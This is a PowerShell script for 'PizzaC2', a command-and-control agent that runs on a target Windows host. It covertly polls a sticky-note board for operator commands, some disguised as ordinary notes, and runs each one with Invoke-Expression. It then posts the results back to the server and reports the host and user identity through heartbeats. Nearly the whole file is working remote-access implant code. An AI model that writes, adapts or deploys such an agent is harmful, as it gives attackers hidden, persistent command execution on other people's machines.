<#
.SYNOPSIS
    PizzaC2 - Windows Native PowerShell Agent (Target Host)
    LOTS (Living Off Trusted Sites) C2 Agent

.DESCRIPTION
    Runs on the target host, joins the Pizza Lounge room using the 6-digit code,
    registers presence, polls for command stickers, executes commands via PowerShell,
    and posts results back as sticky notes on the board.
#>

param(
    [string]$ServerUrl = "http://127.0.0.1:8080",
    [string]$RoomCode = "123456",
    [int]$PollInterval = 3,
    [string]$AgentId = ""
)

$ErrorActionPreference = "SilentlyContinue"

# Configure TLS 1.2
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11 -bor [System.Net.SecurityProtocolType]::Tls

$HostName = $env:COMPUTERNAME
$UserName = $env:USERNAME
if (-not $AgentId) {
    $RandomSuffix = (-join ((48..57) + (97..122) | Get-Random -Count 4 | ForEach-Object {[char]$_}))
    $AgentId = "Agent-$HostName-$RandomSuffix"
}
$AgentDisplayName = "🤖 Agent-$HostName ($UserName)"

Write-Host @"
===================================================================
  ____  _                 ____ ____       _                    _   
 |  _ \(_)___________ _  / ___|___ \     / \   __ _  ___ _ __ | |_ 
 | |_) | |_  /_  / _` | | |     __) |   / _ \ / _` |/ _ \ '_ \| __|
 |  __/| |/ / / / (_| | | |___ / __/   / ___ \ (_| |  __/ | | | |_ 
 |_|   |_/___/___\__,_|  \____|_____| /_/   \_\__, |\___|_| |_|\__|
                                              |___/                
===================================================================
[*] PizzaC2 Target Agent Running
[*] Server:   $ServerUrl
[*] Room:     $RoomCode
[*] Agent ID: $AgentId
[*] Status:   Connecting to Pizza Board...
===================================================================
"@ -ForegroundColor Green

# History of executed note IDs
$ExecutedNotes = New-Object System.Collections.Generic.HashSet[string]

function Send-JsonPost([string]$url, $data) {
    $json = $data | ConvertTo-Json -Compress
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("Content-Type", "application/json; charset=utf-8")
    try {
        $respBytes = $webClient.UploadData($url, "POST", $bytes)
        $respStr = [System.Text.Encoding]::UTF8.GetString($respBytes)
        return ($respStr | ConvertFrom-Json)
    } catch {
        return $null
    }
}

function Get-JsonData([string]$url) {
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("Accept", "application/json")
    try {
        $respStr = $webClient.DownloadString($url)
        return ($respStr | ConvertFrom-Json)
    } catch {
        return $null
    }
}

# 1. Initial Check-in & Room verification
$roomUrl = "$ServerUrl/api/rooms/$RoomCode"
$presenceUrl = "$ServerUrl/api/rooms/$RoomCode/presence"
$notesUrl = "$ServerUrl/api/rooms/$RoomCode/notes"

# Mark already existing notes so agent doesn't execute old commands
$initialData = Get-JsonData $notesUrl
if ($initialData -and $initialData.notes) {
    foreach ($n in $initialData.notes) {
        if ($n.id) { [void]$ExecutedNotes.Add([string]$n.id) }
    }
}

# Heartbeat
function Send-Heartbeat {
    $payload = @{
        id = $AgentId
        name = $AgentDisplayName
        isAgent = $true
        isHost = $false
    }
    $res = Send-JsonPost $presenceUrl $payload
    return ($res -ne $null)
}

Send-Heartbeat
Write-Host "[+] Initial heartbeat sent! Registered in room $RoomCode as $AgentDisplayName" -ForegroundColor Cyan

# Main C2 Execution Loop
$lastHeartbeat = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()

while ($true) {
    try {
        $now = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
        if ($now - $lastHeartbeat -gt 5000) {
            Send-Heartbeat
            $lastHeartbeat = $now
        }

        # Fetch board notes
        $boardData = Get-JsonData $notesUrl
        if ($boardData -and $boardData.notes) {
            foreach ($note in $boardData.notes) {
                $noteId = [string]$note.id
                if (-not $noteId -or $ExecutedNotes.Contains($noteId)) {
                    continue
                }

                # Mark as processed
                [void]$ExecutedNotes.Add($noteId)

                $text = [string]$note.text
                if (-not $text) { continue }
                $text = $text.Trim()

                # Don't execute agent's own responses
                if ($text.StartsWith("[RES]") -or $text.StartsWith("[OUTPUT]")) {
                    continue
                }

                # Check if it's a command sticker
                $isTargeted = $false
                $rawCmd = ""

                # Format 1: "!command" or "!shell command"
                if ($text.StartsWith("!")) {
                    $rawCmd = $text.Substring(1).Trim()
                }
                # Format 2: "[CMD] command"
                elseif ($text.StartsWith("[CMD]")) {
                    $rawCmd = $text.Substring(5).Trim()
                }
                # Format 3: "@Agent-Name: command" or "@all: command"
                elseif ($text -match "^@(\S+):\s*(.+)$") {
                    $target = $matches[1]
                    $candidateCmd = $matches[2]
                    if ($target -eq "all" -or $target -eq $AgentId -or $AgentDisplayName.Contains($target)) {
                        $rawCmd = $candidateCmd.Trim()
                        if ($rawCmd.StartsWith("!")) { $rawCmd = $rawCmd.Substring(1).Trim() }
                    }
                }
                # Format 4: LOTS stealth disguised note: "[c: whoami]" or "{cmd:whoami}"
                elseif ($text -match "\[c:\s*([^\]]+)\]") {
                    $rawCmd = $matches[1].Trim()
                }

                if (-not $rawCmd) {
                    continue
                }

                Write-Host "[!] >>> Received C2 Command: '$rawCmd' (Sticker #$($note.number))" -ForegroundColor Magenta

                # Special Commands
                if ($rawCmd -match "^sleep\s+(\d+)$") {
                    $PollInterval = [int]$matches[1]
                    $resultText = "[RES] #$($note.number) (sleep)`nPoll interval updated to $PollInterval seconds."
                    Send-JsonPost $notesUrl @{
                        author = $AgentDisplayName
                        text = $resultText
                    }
                    continue
                }

                if ($rawCmd -eq "exit" -or $rawCmd -eq "kill") {
                    $resultText = "[RES] #$($note.number) (exit)`nAgent is terminating. Goodbye!"
                    Send-JsonPost $notesUrl @{
                        author = $AgentDisplayName
                        text = $resultText
                    }
                    Write-Host "[*] Agent terminated by operator." -ForegroundColor Red
                    exit 0
                }

                # Built-in helper aliases
                $execScript = switch -Regex ($rawCmd) {
                    "^sysinfo$" { "Get-ComputerInfo | Select-Object WindowsProductName, OsVersion, CsName, CsManufacturer, CsModel, TotalPhysicalMemory | Format-List | Out-String" }
                    "^ps$"      { "Get-Process | Sort-Object CPU -Descending | Select-Object -First 15 Id, ProcessName, CPU, WorkingSet | Format-Table -AutoSize | Out-String" }
                    "^ip$"      { "Get-NetIPAddress -AddressFamily IPv4 | Select-Object InterfaceAlias, IPAddress | Format-Table -AutoSize | Out-String" }
                    default     { $rawCmd }
                }

                # Execute command
                $output = ""
                try {
                    $startTime = Get-Date
                    $cmdResult = Invoke-Expression $execScript 2>&1 | Out-String
                    $duration = ((Get-Date) - $startTime).TotalMilliseconds
                    $output = $cmdResult.Trim()
                    if (-not $output) {
                        $output = "(Command executed successfully with no output)"
                    }
                } catch {
                    $output = "Error: $_"
                }

                # Cap output length for sticker board readability (max 1200 chars)
                if ($output.Length -gt 1200) {
                    $output = $output.Substring(0, 1150) + "`n... [Output truncated, $(output.Length) chars total]"
                }

                Write-Host "[+] Command finished. Posting response sticker..." -ForegroundColor Cyan

                # Format response sticker
                $responseSticker = "[RES] #$($note.number) ($rawCmd)`n$output"
                Send-JsonPost $notesUrl @{
                    author = $AgentDisplayName
                    text = $responseSticker
                }
            }
        }
    } catch {
        # Silent ignore connection drop, keep retrying
    }

    Start-Sleep -Seconds $PollInterval
}
